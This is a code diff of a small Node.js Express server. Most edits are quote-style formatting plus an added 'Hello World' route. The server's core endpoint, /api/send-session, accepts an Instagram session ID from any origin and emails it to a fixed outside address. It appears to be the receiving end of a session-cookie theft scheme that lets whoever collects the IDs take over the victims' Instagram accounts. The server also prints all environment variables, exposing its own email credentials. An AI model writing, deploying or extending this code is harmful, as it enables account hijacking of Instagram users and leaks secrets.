@@ -1,9 +1,9 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const nodemailer = require('nodemailer');
-const cors = require('cors');
-require('dotenv').config()
-console.log(process.env)
+const express = require("express");
+const bodyParser = require("body-parser");
+const nodemailer = require("nodemailer");
+const cors = require("cors");
+require("dotenv").config();
+console.log(process.env);
 
 const app = express();
 app.use(cors());
@@ -11,36 +11,40 @@ app.use(bodyParser.json());
 
 // Configure your email settings
 const transporter = nodemailer.createTransport({
-  service: 'gmail', // or your email provider
+  service: "gmail", // or your email provider
   auth: {
-   user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASSWORD
-  }
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASSWORD,
+  },
 });
 
-app.post('/api/send-session', (req, res) => {
+app.post("/api/send-session", (req, res) => {
   const { sessionId } = req.body;
-  
+
   if (!sessionId) {
-    return res.status(400).json({ error: 'No session ID provided' });
+    return res.status(400).json({ error: "No session ID provided" });
   }
 
   const mailOptions = {
     from: ` <${process.env.EMAIL_USER}>`,
-    to: 'sufi9594@example.com',
-    subject: 'Instagram Session ID',
+    to: "sufi9594@example.com",
+    subject: "Instagram Session ID",
     text: `Instagram Session ID: ${sessionId}`,
-    html: `<p>Instagram Session ID: <strong>${sessionId}</strong></p>`
+    html: `<p>Instagram Session ID: <strong>${sessionId}</strong></p>`,
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
-      console.error('Error sending email:', error);
-      return res.status(500).json({ error: 'Failed to send email' });
+      console.error("Error sending email:", error);
+      return res.status(500).json({ error: "Failed to send email" });
     }
-    console.log('Email sent:', info.response);
-    res.json({ success: true, message: 'Email sent successfully' });
+    console.log("Email sent:", info.response);
+    res.json({ success: true, message: "Email sent successfully" });
   });
+});
+
+app.get("/", (req, res) => {
+  res.send("Hello World!");
 });
 
 const PORT = process.env.PORT || 3000;
